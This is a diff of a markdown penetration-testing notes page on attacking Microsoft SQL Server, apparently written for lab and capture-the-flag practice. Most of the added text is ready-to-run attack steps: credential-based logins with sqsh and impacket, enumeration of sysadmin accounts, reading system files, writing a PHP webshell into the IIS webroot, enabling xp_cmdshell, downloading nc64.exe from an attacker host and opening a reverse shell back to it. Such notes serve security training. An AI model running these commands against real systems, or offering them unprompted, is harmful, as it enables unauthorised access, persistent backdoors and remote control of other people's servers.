@@ -71,17 +71,34 @@ The SA password for SQL Server is the SQL Administrator account built into the p
 
 ### From Linux
 
-[sqsh](sqsh.md)
+#### sqsh
 
+If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:  [sqsh](sqsh.md)
 
-```shell-session
- sqsh -S $IP -U username -P Password123 -h
- # -h: disable headers and footers for a cleaner look.
+```bash
+sqsh -S $IP -U username -P Password123 -h
+# -h: disable headers and footers for a cleaner look.
 
 # When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication.
 sqsh -S $ip -U .\\<username> -P 'MyPassword!' -h
 # For windows authentication we can use  SERVERNAME\\accountname or .\\accountname
 ```
+
+
+#### mssqlclient.py from impacket 
+
+```shell-session
+mssqlclient.py -p $port username@$ip 
+```
+
+
+If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
+
+```bash
+python3 mssqlclient.py Administrator@$ip -windows-auth  
+# With python3 mssqlclient.py help you can see more options.
+```
+
 
 ### From Windows
 
@@ -98,27 +115,7 @@ The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures
 
 ```cmd-session
 sqlcmd -S $IP -U username -P Password123
-
-
-# We need to use GO after our query to execute the SQL syntax. 
-# List databases
-SELECT name FROM master.dbo.sysdatabases
-go
-
-# Use a database
-USE dbName
-go
-
-# Show tables
-SELECT table_name FROM dbName.INFORMATION_SCHEMA.TABLES
-go
-
-# Select all Data from Table "users"
-SELECT * FROM users
-go
-
 ```
-
 
 ### GUI Application
 
@@ -142,12 +139,20 @@ dbeaver &
 # Once we have access to the database using a command-line utility or a GUI application, we can use common [Transact-SQL statements](https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15) to enumerate databases and tables containing sensitive information such as usernames and passwords.
 ```
 
-#### mssqlclient.py
+#### mssqlclient.py from impacket 
 
 Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.
 
 ```shell-session
-mssqlclient.py -p 1433 <username>@$ip 
+mssqlclient.py -p $port username@$ip 
+```
+
+
+If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.
+
+```bash
+python3 mssqlclient.py Administrator@$ip -windows-auth  
+# With python3 mssqlclient.py help you can see more options.
 ```
 
 
@@ -161,12 +166,31 @@ select @@version;
 select user_name()
 go 
 
-# Get databases
+# We need to use GO after our query to execute the SQL syntax. 
+# List databases
 SELECT name FROM master.dbo.sysdatabases
 go
 
-# Get current database
+# Select a database
+USE $dbName
+go
+## Examples: Select a database master
+## USE master
+
+# Check out which one is the current selected database
 SELECT DB_NAME()
+go
+
+# Show tables
+SELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES
+go
+
+# Select a database and show content of a specific table.  
+USE $dbName
+SELECT * FROM $tableName 
+
+# Example: Select all Data from Table "users". The name of the table ("users") was obtained when running the command for showing the tables.
+SELECT * FROM users
 go
 
 # Get a list of users in the domain
@@ -178,15 +202,94 @@ SELECT name FROM master..syslogins WHERE sysadmin = 1
 go
 
 # And to make sure: 
-SELECT is_srvrolemember(‘sysadmin’)
+SELECT is_srvrolemember('sysadmin')
 go
 # If your user is admin, it will return 1.
+```
 
-# Read Local Files in MSSQL
+
+Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section `Executing cmd shell in a SQL command line`).
+
+### Write files using MSSQL
+To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:
+
+```cmd-session
+sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure 'Ole Automation Procedures', 1;
+RECONFIGURE;
+```
+
+### Create files using MSSQL
+
+```
+# Using MSSQL to Create a File
+DECLARE @OLE INT;
+DECLARE @FileID INT;
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
+EXECUTE sp_OADestroy @FileID;
+EXECUTE sp_OADestroy @OLE;
+```
+
+### Read files using MSSQL
+
+```
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 ```
 
-Also, you might be interested in executing a cmd shell using [xp_cmdshell by reconfiguring sp_configure](1433-mssql.md).
 
+### Executing cmd shell in a SQL command line
 
+Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command **xp_cmdshell**, that will allow us to use the SQL command line as a CLI. 
 
+Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
+
+**sp_configure** displays or changes global configuration settings for the current settings. This is how you may take advantage of it:
+
+```msSQL
+# To allow advanced options to be changed.   
+EXECUTE sp_configure 'show advanced options', 1
+go
+  
+# To update the currently configured value for advanced options.  
+RECONFIGURE
+go
+
+# To enable the feature.  
+EXECUTE sp_configure 'xp_cmdshell', 1
+go
+
+# To update the currently configured value for this feature.  
+RECONFIGURE
+go
+```
+
+>Note:  The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
+
+Now we can use the MSSQL terminal to execute commands:
+
+```msSQL
+# Who am i?
+xp_cmdshell 'whoami'
+go
+
+# This will return the .exe files existing in the current directory
+EXEC xp_cmdshell 'dir *.exe'
+go
+
+# To print a file
+EXECUTE xp_cmdshell 'type c:\Users\sql_svc\Desktop\user.txt
+go
+
+# With this (and a "python3 -m http.server 80" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe"
+go
+
+# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a "nc -lnvp 443". When launching the reverse shell, we'll get a powershell terminal in this tab by running:
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443";
+# You could also upload winPEAS and run it from this powershell command line
+```
+
+There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).
